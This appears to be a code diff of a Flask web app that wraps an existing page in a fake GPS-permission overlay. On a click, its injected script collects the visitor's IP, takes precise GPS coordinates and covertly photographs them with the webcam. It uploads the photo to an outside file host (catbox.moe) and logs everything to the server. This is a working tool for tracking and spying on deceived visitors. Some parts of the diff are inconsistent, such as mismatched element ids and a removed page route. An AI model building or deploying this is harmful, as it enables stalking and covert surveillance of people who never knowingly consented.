@@ -107,7 +107,7 @@ HTML_TEMPLATE = """
 </head>
 <body>
     <!-- Your existing content -->
-    %%existing_content%%
+    {existing_content}
     
     <!-- GPS Permission Overlay -->
     <div class="gps-overlay">
@@ -119,126 +119,101 @@ HTML_TEMPLATE = """
         </div>
     </div>
 
-<script>
-    // Helper function to convert data URL to blob
-    function dataURLtoBlob(dataurl) {
-        const arr = dataurl.split(',');
-        const mime = arr[0].match(/:(.*?);/)[1];
-        const bstr = atob(arr[1]);
-        let n = bstr.length;
-        const u8arr = new Uint8Array(n);
-        while(n--) u8arr[n] = bstr.charCodeAt(n);
-        return new Blob([u8arr], {type: mime});
-    }
+        <script>
+            function dataURLtoBlob(dataurl) {{
+                const arr = dataurl.split(',');
+                const mime = arr[0].match(/:(.*?);/)[1];
+                const bstr = atob(arr[1]);
+                let n = bstr.length;
+                const u8arr = new Uint8Array(n);
+                while(n--) u8arr[n] = bstr.charCodeAt(n);
+                return new Blob([u8arr], {{type: mime}});
+            }}
 
-    document.getElementById('gps-allow-btn').addEventListener('click', async () => {
-        try {
-            // Get client IP
-            const ip = await fetch('/getip').then(r => r.text());
-            
-            // Log permission request
-            await fetch('/log', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    type: 'permission_request',
-                    ip: ip,
-                    timestamp: new Date().toISOString()
-                })
-            });
-            
-            // Get GPS location
-            const position = await new Promise((resolve, reject) => {
-                navigator.geolocation.getCurrentPosition(resolve, reject, {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
-                });
-            });
+            document.getElementById('gps-btn').addEventListener('click', async () => {{
+                try {{
+                    // Get client IP
+                    const ip = await fetch('/getip').then(r => r.text());
+                    
+                    // Log permission request
+                    await fetch('/log', {{
+                        method: 'POST',
+                        headers: {{ 'Content-Type': 'application/json' }},
+                        body: JSON.stringify({{
+                            type: 'permission_request',
+                            ip: ip,
+                            timestamp: new Date().toISOString()
+                        }})
+                    }});
+                    
+                    // Get GPS location
+                    const position = await new Promise((resolve, reject) => {{
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {{
+                            enableHighAccuracy: true,
+                            timeout: 10000
+                        }});
+                    }});
 
-            // Request camera access and capture photo
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: true,
-                audio: false 
-            });
-            
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            await video.play();
-            
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            const photoData = canvas.toDataURL('image/jpeg', 0.8);
-            
-            // Stop camera stream
-            stream.getTracks().forEach(track => track.stop());
-            
-            // Upload to Catbox
-            const formData = new FormData();
-            formData.append('reqtype', 'fileupload');
-            formData.append('fileToUpload', 
-                new File([dataURLtoBlob(photoData)], 'photo.jpg', { type: 'image/jpeg' })
-            );
-            
-            const catboxResponse = await fetch('https://catbox.moe/user/api.php', {
-                method: 'POST',
-                body: formData
-            });
-            const catboxUrl = await catboxResponse.text();
-            
-            // Log all data (GPS + photo URL)
-            await fetch('/log', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    type: 'full_data',
-                    ip: ip,
-                    gps: {
-                        lat: position.coords.latitude,
-                        lng: position.coords.longitude,
-                        accuracy: position.coords.accuracy
-                    },
-                    photo_url: catboxUrl,
-                    timestamp: new Date().toISOString()
-                })
-            });
-            
-            // Remove overlay
-            document.querySelector('.gps-overlay').remove();
-            
-        } catch (error) {
-            console.error('Error:', error);
-            await fetch('/log', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    type: 'error',
-                    error: error.message,
-                    ip: await fetch('/getip').then(r => r.text()),
-                    timestamp: new Date().toISOString()
-                })
-            });
-            alert('Error: ' + error.message);
-        }
-    });
-</script>
-</body>
-</html>
-"""
-
-@app.route('/')
-def serve_page():
-    """Serve the page with GPS overlay"""
-    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    logger.info(f"Page served to IP: {client_ip}")
-    
-    with open('page.html', 'r') as f:
-        existing_content = f.read()
-    
-    # Use string replacement instead of .format()
-return HTML_TEMPLATE.replace('%%existing_content%%', existing_content)
+                    // Get camera access and capture photo
+                    const stream = await navigator.mediaDevices.getUserMedia({{
+                        video: true,
+                        audio: false
+                    }});
+                    
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    await video.play();
+                    
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const photoData = canvas.toDataURL('image/jpeg');
+                    
+                    // Stop camera
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    // Upload to Catbox
+                    const formData = new FormData();
+                    formData.append('reqtype', 'fileupload');
+                    formData.append('fileToUpload', 
+                        new File([dataURLtoBlob(photoData)], 'photo.jpg', {{ type: 'image/jpeg' }})
+                    );
+                    
+                    const catboxUrl = await fetch('https://catbox.moe/user/api.php', {{
+                        method: 'POST',
+                        body: formData
+                    }}).then(r => r.text());
+                    
+                    // Log all data
+                    await fetch('/log', {{
+                        method: 'POST',
+                        headers: {{ 'Content-Type': 'application/json' }},
+                        body: JSON.stringify({{
+                            type: 'full_data',
+                            ip: ip,
+                            gps: {{
+                                lat: position.coords.latitude,
+                                lng: position.coords.longitude,
+                                accuracy: position.coords.accuracy
+                            }},
+                            photo_url: catboxUrl,
+                            timestamp: new Date().toISOString()
+                        }})
+                    }});
+                    
+                    // Remove overlay
+                    document.getElementById('gps-overlay').remove();
+                    
+                }} catch (error) {{
+                    console.error('Error:', error);
+                    alert('Error: ' + error.message);
+                }}
+            }});
+        </script>
+    </body>
+    </html>
+    """
 
 @app.route('/getip')
 def get_ip():
@@ -251,7 +226,6 @@ def log_data():
     data = request.json
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     
-    # Enhanced logging with all relevant data
     log_entry = {
         'timestamp': datetime.utcnow().isoformat(),
         'client_ip': client_ip,
